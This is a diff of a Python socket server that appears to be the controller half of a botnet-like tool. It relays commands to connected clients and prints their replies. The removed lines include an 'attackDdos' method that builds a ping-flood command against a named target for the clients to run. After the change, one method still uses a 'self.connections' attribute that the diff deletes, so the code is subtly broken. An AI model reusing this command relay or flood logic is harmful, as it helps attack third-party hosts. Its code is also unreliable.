@@ -1,16 +1,14 @@
 import socket
-from Functions import setMessage, getMessage
-from threading import Thread
+from Functions import setMessage, getMessage, addConnection
+import threading
 #from _dbus_bindings import Message
 
-class Server(Thread):
-
-    def __init__(self, ip, port):
-        self.ip = ip
-        self.port = port
+class Server(threading.Thread):
 
     def run(self):
-        self.connections = {}
+        
+        self.init()
+        
         print(str(self.ip) + " " + str(self.port))
         # Create a TCP/IP socket
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
@@ -23,32 +21,35 @@ class Server(Thread):
             # Wait for a connection
             connection, client_address = sock.accept()            
             try:
-                self.connections[client_address] =  connection
+                addConnection(client_address,connection)
                 self.runSpecific(connection)                              
             finally:
                 # Clean up the connection
                 connection.close()
-                
-    def getIpsConnections(self):
-        return self.connections.keys()
 
 class ServerOutput(Server):
+
+    def init(self):
+        self.ip = "10.12.5.43"
+        self.port = 10001
             
     def runSpecific(self, connection):
         data = connection.recv(160000).decode("utf-8")
         print(data)
     
 class ServerInput(Server):
-        
-    def attackDdos(self,canonicalName,times, packageWeight):
-        setMessage("ping "+ canonicalName + " -n "+ str(times) + " -l " + str(packageWeight),False)
     
+    def init(self):
+        self.ip = "10.12.5.43"
+        self.port = 10000
+
     def conectWithOneConnection(self,key,command):
         connection = self.connections.get(key) 
         setMessage(command)
         self.runSpecific(connection)
     
     def runSpecific(self, connection):
+        print(getMessage())
         connection.sendall(getMessage())
 
 
